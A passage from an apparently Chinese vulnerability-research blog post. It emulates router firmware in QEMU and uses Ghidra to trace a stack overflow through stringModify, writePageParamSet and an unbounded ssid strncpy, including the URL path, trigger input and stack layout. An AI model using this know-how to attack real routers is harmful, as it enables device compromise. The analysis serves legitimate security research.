<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/httpd</span><br></pre></td></tr></table></figure>
<p>运行会报很多错误，参考H4lo师傅的方法hook一下函数来解决问题。将我们编译好的链接库通过scp传入到Qemu虚拟机中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#mips-linux-gnu-gcc -shared -fPIC hook.c -o hook</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">system</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *command)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HOOK: system(\&quot;%s\&quot;)&quot;</span>,command);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1337</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1337</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新运行，遇到<code>/usr/bin/httpd: can&#39;t load library &#39;libc.so.6</code>这种问题，使用软链接解决即可。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 挂载文件系统</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mount --<span class="built_in">bind</span> /proc squashfs-root/proc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 更换root目录</span></span><br><span class="line"><span class="meta">$</span><span class="bash">	<span class="built_in">cd</span> squashfs-root/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chroot . bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> LD_PRELOAD=<span class="string">&quot;/hook&quot;</span> /usr/bin/httpd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> /usr/bin/httpd: can<span class="string">&#x27;t load library &#x27;</span>libc.so.6<span class="string">&#x27;</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ln -s  libc.so.0  libc.so.6</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> LD_PRELOAD=<span class="string">&quot;/hook&quot;</span> /usr/bin/httpd</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">gdb调试</span></span><br><span class="line">export LD_PRELOAD=&quot;/hook&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">./gdbserver-7.12-mips-be 0.0.0.0:2333  /usr/bin/httpd <span class="comment">#这个版本的gdb挂起有点问题</span></span></span><br><span class="line">./gdbserver.mipsbe  0.0.0.0:2333  /usr/bin/httpd</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/UjkegK.png" alt="UjkegK"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-19%20%E4%B8%8A%E5%8D%889.22.41.png" alt="屏幕快照2021-01-19上午9.22.41"></p>
<p>进入Web后台界面时候，登陆账号（账号密码都是admin）</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/W8mGSC.png" alt="W8mGSC"></p>
<p><strong>其他问题</strong></p>
<ul>
<li><p>设置桥接之后主机无法联网的问题</p>
<p>初始化网桥时候将dns给删了,添加一下dns即可。</p>
<p>修改文件 <strong>&#x2F;etc&#x2F;resolvconf&#x2F;resolv.conf.d&#x2F;base</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nameserver 8.8.8.8</span><br><span class="line">nameserver 8.8.4.4</span><br></pre></td></tr></table></figure>
<p>执行更新</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resolvconf -u</span><br></pre></td></tr></table></figure></li>
<li><p>ssh或者scp报错<code>Unable to negotiate with 10.211.55.8 port 22: no matching host key type found. Their offer: ssh-dss</code></p>
<p>添加参数<code> -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1</code>,比如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh root@10.211.55.8 -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sshpass -p root  scp -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1 gdbserver-7.12-mips-be root@10.211.55.8:~/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>gdb调试</strong></p>
<p>使用scp将gdbserver拷贝到squashfs-root目录下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp r gdbserver.mipsbe root@10.211.55.7:~/squashfs-root/</span><br></pre></td></tr></table></figure>
<p>使用gdbserver将httpd调试转发到2333端口</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD=&quot;/hook&quot;</span><br><span class="line">./gdbserver-7.12-mips-be 0.0.0.0:2333  /usr/bin/httpd</span><br></pre></td></tr></table></figure>
<p>宿主机的gdb通过remote target进行远程调试。不过总是连不上。。报错<code>Remote replied unexpectedly to &#39;vMustReplyEmpty&#39;: timeout</code>。</p>
<p>参考stackoverflow上的<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/55713340/error-connecting-to-remote-gdbserver-through-gdb">回答</a>,将内核版本从vmlinux-2.6.32-5-4kc-malta更换为[vmlinux-3.2.0-4-4kc-malta](wget <a target="_blank" rel="noopener" href="https://people.debian.org//~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta">https://people.debian.org/\~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta</a>)</p>
<p>换了结果确实换了内核版本就成功了（汗</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/PLGE6I.png" alt="PLGE6I"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>用Ghidra逆向分析*&#x2F;usr&#x2F;bin&#x2F;httpd* 文件,<strong>stringModify</strong>包含三个参数，分别是dst、len、src，很明显是拷贝函数。经过分析可以知道stringModify主要用于拷贝string并且对其进行一定的过滤，包括对转义字符的修改，对于\r和\n的转义等。但是函数并没有包含对dst的检查，以及对len的限制，如果使用者dst创建的过小就有可能产生栈溢出ou。（就相当于一个对字符有一定转义作用的strcpy）</p>
<p>当然，还有一个最有趣，并且直接导致漏洞的是，生成<code>&lt;/br&gt;</code>的时候，写入了4个字节的数字，但是记录长度的iVar3变量却只加了1，导致理论上我们能够输入len长度4倍大数据，这样能够直接对任何调用stringModify的函数产生缓冲区溢出。</p>
<p>参考poc中输入*&#x2F;%0A<em>（或者</em>&#x2F;%0D*）会而页面会输出<code>\/&lt;br&gt;</code>，(0x0a对应\n,0x0d对应\r)，可见我们出触法了生成<code>&lt;br&gt;</code>的代码。下面是这段代码经过stringModify转义分析。<strong>注意代码中只对单独存在的<code>\n</code>进行转义（连续的\n并不会触发这个漏洞点），这就是为什么我们输入的\n之间需要用其他符号隔开（经过实验证明，把\换成&lt;之类的符号也可以溢出成功）。</strong>（%0A转义成\n的部分我没有找到代码，但是理论上应该有一个函数在我们进入StringModify之前实现了转义，其实这个就是前端的基础编码。。）</p>
<table>
<thead>
<tr>
<th>转义前</th>
<th>转义后</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td><code>/</code></td>
<td><code>\\/</code></td>
<td><code>\/</code></td>
</tr>
<tr>
<td><code>%0A</code></td>
<td><code>\n</code></td>
<td><code>&lt;br&gt;</code></td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stringModify</span><span class="params">(<span class="keyword">char</span> *dst,<span class="keyword">int</span> len,<span class="keyword">int</span> src)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cVar1;  <span class="comment">//作为临时存储src单个字节内容</span></span><br><span class="line">  <span class="keyword">char</span> *pcVar2; <span class="comment">//指向src的指针</span></span><br><span class="line">  <span class="keyword">int</span> iVar3;  <span class="comment">//返回值（返回String的长度）</span></span><br><span class="line">  <span class="comment">/*首先判断拷贝地址dst是否为0，将pcVar2指针指向src+1的位置*/</span></span><br><span class="line">  <span class="keyword">if</span> ((dst == (<span class="keyword">char</span> *)<span class="number">0x0</span>) || (pcVar2 = (<span class="keyword">char</span> *)(src + <span class="number">1</span>), src == <span class="number">0</span>)) &#123;</span><br><span class="line">    iVar3 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    iVar3 = <span class="number">0</span>;	<span class="comment">//初始化返回值为0</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">      cVar1 = pcVar2[<span class="number">-1</span>];	<span class="comment">//访问拷贝来源src的首部，并且作出判断</span></span><br><span class="line">      <span class="keyword">if</span> ((cVar1 == <span class="string">&#x27;\0&#x27;</span>) || (len &lt;= iVar3)) <span class="keyword">break</span>; <span class="comment">//判断是否截断，长度是否一致</span></span><br><span class="line">      <span class="keyword">if</span> (cVar1 == <span class="string">&#x27;/&#x27;</span>) &#123;	<span class="comment">/*当字符是转移字符&#x27;\&#x27;时候*/</span></span><br><span class="line">LAB_0043bb48:</span><br><span class="line">        *dst = <span class="string">&#x27;\\&#x27;</span>;	<span class="comment">//判断转义字符&#x27;/&#x27;，并且将转义字符转化为&#x27;\\&#x27;</span></span><br><span class="line">LAB_0043bb4c:</span><br><span class="line">        iVar3 = iVar3 + <span class="number">1</span>; <span class="comment">//返回的length+1</span></span><br><span class="line">        dst = dst + <span class="number">1</span>;	<span class="comment">//dst指针向后移动一位</span></span><br><span class="line">LAB_0043bb54:</span><br><span class="line">        *dst = pcVar2[<span class="number">-1</span>];  <span class="comment">//将转译字符的一位数据，添加也添加到dst中</span></span><br><span class="line">        dst = dst + <span class="number">1</span>;  <span class="comment">//dst指针继续向后移动</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;/&#x27;</span> &lt; cVar1) &#123;</span><br><span class="line">          <span class="keyword">if</span> ((cVar1 == <span class="string">&#x27;&gt;&#x27;</span>) || (cVar1 == <span class="string">&#x27;\\&#x27;</span>)) <span class="keyword">goto</span> LAB_0043bb48;</span><br><span class="line">          <span class="keyword">if</span> (cVar1 == <span class="string">&#x27;&lt;&#x27;</span>) &#123;</span><br><span class="line">            *dst = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LAB_0043bb4c;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LAB_0043bb54;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cVar1 != <span class="string">&#x27;\r&#x27;</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (cVar1 == <span class="string">&#x27;\&quot;&#x27;</span>) <span class="keyword">goto</span> LAB_0043bb48;</span><br><span class="line">          <span class="keyword">if</span> (cVar1 != <span class="string">&#x27;\n&#x27;</span>) <span class="keyword">goto</span> LAB_0043bb54;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*将\r或者\n转化为html中的&lt;br&gt;*/</span></span><br><span class="line">        <span class="keyword">if</span> ((*pcVar2 != <span class="string">&#x27;\r&#x27;</span>) &amp;&amp; (*pcVar2 != <span class="string">&#x27;\n&#x27;</span>)) &#123;	 <span class="comment">//这部分检测src序列是否包含重复\r或者\n</span></span><br><span class="line">          *dst = <span class="string">&#x27;&lt;&#x27;</span>;</span><br><span class="line">          dst[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">          dst[<span class="number">2</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">          dst[<span class="number">3</span>] = <span class="string">&#x27;&gt;&#x27;</span>;</span><br><span class="line">          dst = dst + <span class="number">4</span>; 	<span class="comment">//写入4个字节，但是iVar3每次只会+1</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      iVar3 = iVar3 + <span class="number">1</span>;</span><br><span class="line">      pcVar2 = pcVar2 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *dst = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> iVar3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>让我们去源代码里搜索调用stringModify而可能产生栈溢出的地方。   于是我们找到了writePageParamSet函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writePageParamSet</span><span class="params">(undefined4 param_1,<span class="keyword">char</span> *param_2,<span class="keyword">int</span> *param_3)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  undefined *puVar2;</span><br><span class="line">  undefined local_210 [<span class="number">512</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (param_3 == (<span class="keyword">int</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    HTTP_DEBUG_PRINT(<span class="string">&quot;basicWeb/httpWebV3Common.c:178&quot;</span>,<span class="string">&quot;Never Write NULL to page, %s, %d&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;writePageParamSet&quot;</span>,<span class="number">0xb2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(param_2,<span class="string">&quot;\&quot;%s\&quot;,&quot;</span>); <span class="comment">//判断匹配字符串</span></span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar1 = stringModify(local_210,<span class="number">0x200</span>,param_3); <span class="comment">//调用stringModify</span></span><br><span class="line">    <span class="keyword">if</span> (iVar1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;string modify error!&quot;</span>);</span><br><span class="line">      local_210[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    puVar2 = local_210;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(param_2,<span class="string">&quot;%d,&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    puVar2 = (undefined *)*param_3;</span><br><span class="line">  &#125;</span><br><span class="line">  httpPrintf(param_1,param_2,puVar2);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后继续回溯，我们找到了会使得writePageParamSet调用stringModify的函数，<strong>UndefinedFunction_0045fa94</strong>。UndefinedFunction_0045fa94函数在取出ssid的时候，将ssid放入一个很小的缓冲区acStack3080中，并且没有对长度进行限制，导致能够产生栈溢出。</p>
<p>初学Ghidra，所以让我们分析一下他的变量分析方式，就拿我们溢出的缓冲区<strong>acStack3460</strong>来说，在Mips汇编的表示为0xcc(sp)，即距离栈顶（地址较小的那一端）0xcc距离的内存地址（buffer&#x3D;sp+0xcc），让我们继续想下看，uint类型<strong>uStack3424</strong>的地址为0xe4(sp),即地址为sp+0xf0。两者之差(36)即acStack3460的默认空间。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-24%20%E4%B8%8B%E5%8D%883.33.52.png" alt="屏幕快照2021-01-24下午3.33.52"></p>
<p>让我们再找一找返回值的地址，0xe4c(sp)距离sp 0xe4c 个字节。</p>
<p>经过审计，我们发现通过ssid参数，我们可以写入超量的数据而不会被限制，当然，距离ret地址还是有一些远的，在调用<code>writePageParamSet(param_1,&amp;DAT_00544d38,acStack3460,0);</code>会调用stringModify。将这个超量的数据写入writePageParamSet栈中的512字节的buffer，造成缓冲区溢出。另外，需要注意的是我们还需要设置其他几个参数，因为这几个参数在ssid(acStack3460)的缓冲区下面，如果设置为默认值0x1则会产生\x00而截断我们的超长数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x00  |             |</span><br><span class="line">      | ssid        |</span><br><span class="line">      |             |</span><br><span class="line">0x24  | curRegion   |</span><br><span class="line">0x28  | channel     |</span><br><span class="line">0x2c  | chanWidth   |</span><br><span class="line">0x30  | mode        |</span><br><span class="line">0x34  | wrr         |</span><br><span class="line">0x38  | sb          |</span><br><span class="line">0x3c  | select      |</span><br><span class="line">0x40  | rate        |</span><br><span class="line"> ...</span><br><span class="line">0x??  | return addr |</span><br></pre></td></tr></table></figure>
<p>而代码中的<code>&quot;/userRpm/popupSiteSurveyRpm.htm&quot;</code>则提醒着我们在测试时url的目录为*”&#x2F;userRpm&#x2F;popupSiteSurveyRpm.htm”*</p>
<p>代码做了一些删减，完整版见附录：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">UndefinedFunction_0045fa94</span><span class="params">(undefined4 param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">		...</span><br><span class="line">  	<span class="keyword">char</span> acStack3460 [<span class="number">36</span>]; <span class="comment">//创建36字节的buffer</span></span><br><span class="line">  	...</span><br><span class="line">    <span class="built_in">memset</span>(acStack3460,<span class="number">0</span>,<span class="number">0x44</span>);</span><br><span class="line">    uStack3612 = <span class="number">0</span>;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,<span class="string">&quot;ssid&quot;</span>);<span class="comment">//从http请求头中取出ssid</span></span><br><span class="line">    <span class="keyword">if</span> (pcVar9 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      acStack3460[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      __n = <span class="built_in">strlen</span>(pcVar9);<span class="comment">/*将ssid的数据写入buffer中*/</span></span><br><span class="line">      <span class="built_in">strncpy</span>(acStack3460,pcVar9,__n);<span class="comment">//BufferOverflow</span></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">//顺便审计一下剩下的代码有没有漏洞</span></span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,<span class="string">&quot;curRegion&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      uStack3424 = <span class="number">0x11</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      uStack3612 = atoi(pcVar9);</span><br><span class="line">      <span class="keyword">if</span> (uStack3612 &lt; <span class="number">0x6c</span>) &#123;</span><br><span class="line">        uStack3424 = uStack3612;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,<span class="string">&quot;channel&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      uStack3420 = <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      uStack3612 = atoi(pcVar9);</span><br><span class="line">      <span class="keyword">if</span> (uStack3612 - <span class="number">1</span> &lt; <span class="number">0xf</span>) &#123;</span><br><span class="line">        uStack3420 = uStack3612;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,<span class="string">&quot;chanWidth&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      uStack3416 = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      uStack3612 = atoi(pcVar9);</span><br><span class="line">      <span class="keyword">if</span> (uStack3612 - <span class="number">1</span> &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        uStack3416 = uStack3612;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,<span class="string">&quot;mode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      uStack3412 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      uStack3612 = atoi(pcVar9);</span><br><span class="line">      <span class="keyword">if</span> (uStack3612 - <span class="number">1</span> &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        uStack3412 = uStack3612;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,&amp;DAT_00548138);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(pcVar9,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) || (iVar1 = atoi(pcVar9), iVar1 == <span class="number">1</span>)) &#123;</span><br><span class="line">        uStack3408 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        uStack3408 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,&amp;DAT_0054813c);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(pcVar9,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) || (iVar1 = atoi(pcVar9), iVar1 == <span class="number">1</span>)) &#123;</span><br><span class="line">        uStack3404 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        uStack3404 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,<span class="string">&quot;select&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(pcVar9,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) || (iVar1 = atoi(pcVar9), iVar1 == <span class="number">1</span>)) &#123;</span><br><span class="line">        uStack3400 = <span 